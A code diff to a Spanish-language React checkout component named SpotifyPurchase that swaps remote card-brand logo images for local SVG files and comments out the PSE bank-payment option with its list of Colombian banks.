@@ -1,8 +1,10 @@
 "use client"
 
 import { useState, useEffect } from "react"
-import Visa from "./img/visa-logo-generic.png"
+import VisaLogo from "./img/visa.svg"
 import PSELogo from "./img/pse.png"
+import MasterCard from "./img/mastercard-full.svg"
+import Amex from "./img/amex.svg"
 import { CreditCard } from "lucide-react"
 import { Link } from "react-router"
 import usePaymentStore from './store'
@@ -154,9 +156,9 @@ export const SpotifyPurchase = () => {
                 <span className="font-medium ml-3">Tarjeta de crédito o débito</span>
               </div>
               <div className="flex gap-2 ml-7 mt-4">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa" className="h-4" />
-                <img src="https://1000marcas.net/wp-content/uploads/2019/12/logo-Mastercard.png" alt="Mastercard" className="h-4" />
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/American_Express_logo_%282018%29.svg/1200px-American_Express_logo_%282018%29.svg.png" alt="American Express" className="h-6" />
+                <img src={VisaLogo} className="h-4" />
+                <img src={MasterCard} className="h-4" />
+                <img src={Amex} className="h-6" />
               </div>
 
               {/* Formulario visible solo si está seleccionado */}
@@ -224,46 +226,46 @@ export const SpotifyPurchase = () => {
 
           {/* PSE */}
           {/* PSE */}
-          <div
-            onClick={() => setPaymentMethod("pse")}
-            className={`cursor-pointer hover:bg-gray-50 transition-colors border-l border-b border-r py-5  ${paymentMethod === "pse" ? "border" : ""}`}
+          {/* <div */}
+            {/* onClick={() => setPaymentMethod("pse")} */}
+            {/* className={`cursor-pointer hover:bg-gray-50 transition-colors border-l border-b border-r py-5  ${paymentMethod === "pse" ? "border" : ""}`} */}
 
-          >
-            <div className="p-4">
-              <div className="flex items-center">
-                <input
-                  type="radio"
-                  checked={paymentMethod === "pse"}
-                  onChange={() => setPaymentMethod("pse")}
+          {/* > */}
+            {/* <div className="p-4"> */}
+              {/* <div className="flex items-center"> */}
+                {/* <input */}
+                  {/* type="radio" */}
+                  {/* checked={paymentMethod === "pse"} */}
+                  {/* onChange={() => setPaymentMethod("pse")} */}
 
-                />
-                <span className="font-medium ml-3">PSE</span>
-              </div>
-              <div className="ml-7 mt-4">
-                <img src={PSELogo} alt="PSE" className="h-5" />
-              </div>
+                {/* /> */}
+                {/* <span className="font-medium ml-3">PSE</span> */}
+              {/* </div> */}
+              {/* <div className="ml-7 mt-4"> */}
+                {/* <img src={PSELogo} alt="PSE" className="h-5" /> */}
+              {/* </div> */}
               {/* Formulario visible solo si está seleccionado */}
-              {paymentMethod === "pse" && (
-                <div className="mt-6">
-                  <label htmlFor="banco" className="font-semibold">Selecciona tu banco</label>
-                  <select
-                    id="banco"
-                    className="w-full border p-3 rounded-md mt-2"
-                    value={selectedBank}
-                    onChange={e => setSelectedBank(e.target.value)}
-                  >
-                    <option value="">Selecciona un banco</option>
-                    <option value="banco av villas">Banco AV Villas</option>
-                    <option value="bancolombia">Bancolombia</option>
-                    <option value="banco de bogotá">Banco de Bogotá</option>
-                    <option value="nequi">Nequi</option>
-                    <option value="banco de occidente">Banco de Occidente</option>
-                    <option value="banco popular">Banco Popular</option>
-                  </select>
-                </div>
-              )}
-            </div>
-          </div>
+              {/* {paymentMethod === "pse" && ( */}
+                {/* <div className="mt-6"> */}
+                  {/* <label htmlFor="banco" className="font-semibold">Selecciona tu banco</label> */}
+                  {/* <select */}
+                    {/* id="banco" */}
+                    {/* className="w-full border p-3 rounded-md mt-2" */}
+                    {/* value={selectedBank} */}
+                    {/* onChange={e => setSelectedBank(e.target.value)} */}
+                  {/* > */}
+                    {/* <option value="">Selecciona un banco</option> */}
+                    {/* <option value="banco av villas">Banco AV Villas</option> */}
+                    {/* <option value="bancolombia">Bancolombia</option> */}
+                    {/* <option value="banco de bogotá">Banco de Bogotá</option> */}
+                    {/* <option value="nequi">Nequi</option> */}
+                    {/* <option value="banco de occidente">Banco de Occidente</option> */}
+                    {/* <option value="banco popular">Banco Popular</option> */}
+                  {/* </select> */}
+                {/* </div> */}
+              {/* )} */}
+            {/* </div> */}
+          {/* </div> */}
         </div>
 
         <div className="grid">
